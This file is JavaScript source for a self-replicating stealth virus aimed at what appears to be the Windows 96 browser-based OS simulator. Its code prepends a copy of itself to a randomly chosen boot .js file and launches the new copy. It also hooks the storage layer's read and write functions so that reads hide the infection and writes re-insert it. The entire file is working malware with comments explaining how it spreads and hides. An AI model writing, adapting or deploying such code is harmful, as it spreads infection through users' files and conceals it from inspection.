(async function self(infection_id, spawn) {
    // Intended to spawn new infections when written off of boot disk
    // Spawn = true on disk
    // Spawn = false on fresh run (to hide new infection on disk)
    function selfie(infection_id, spawn) {
        return `(${self})(${infection_id},${spawn});\n\n`;
    }

    let infected_files = new Set();

    function checkAndRemoveInfection(binary) {
        try {
            let decoder = new TextDecoder("utf-8", {fatal: true});
            let encoder = new TextEncoder();
            let text = decoder.decode(binary);
            let cleaned_text = text.split(selfie(infection_id,true)).join(""); // The version on disk always has spawn true, even if we're running spawn false
            let reencoded = encoder.encode(cleaned_text);
            return {
                cleaned: reencoded,
                infected: cleaned_text.length < text.length
            };
        } catch(e) { // Not valid-seeming UTF-8
            return {
                cleaned: binary,
                infected: false
            };
        }
    }

    // Spread infection
    if(spawn) {
        (async function () {
            let sysfiles = await w96.FS.walk("C:/system/boot");
            let infectable = sysfiles.filter(path => path.endsWith(".js"));
            let file_to_infect = infectable[Math.floor(Math.random() * infectable.length)];
            console.log("Infecting", file_to_infect);
            let original_data = await w96.FS.readstr(file_to_infect);
            let new_infection_id = Math.floor(Math.random() * 1000000);
            await w96.FS.writestr(file_to_infect, `${selfie(new_infection_id,true)}${original_data}`);
            self(new_infection_id,false); // Initialize newly spread infection so it can hide itself
        })();
    }

    // Hide inside localStorageDB convenience functions
    // Hide on 

    let originalGetItem = localStorageDB.getItem.bind(localStorageDB);
    let originalSetItem = localStorageDB.setItem.bind(localStorageDB);

    localStorageDB.getItem = function(item_name, closure) {
        originalGetItem(item_name, function(result) {
            let { cleaned, infected } = checkAndRemoveInfection(result);
            if(infected) {
                infected_files.add(item_name);
            }
            setTimeout(() => closure(cleaned), 250);
        });
    };

    localStorageDB.setItem = function(item_name, new_value) {
        if(infected_files.has(item_name)) {
            let encoded_self = (new TextEncoder).encode(selfie(infection_id,true));
            originalSetItem(item_name, new Uint8Array([...encoded_self, ...new_value]));
        } else {
            originalSetItem(item_name, new_value);
        }
    }

})(0, true);
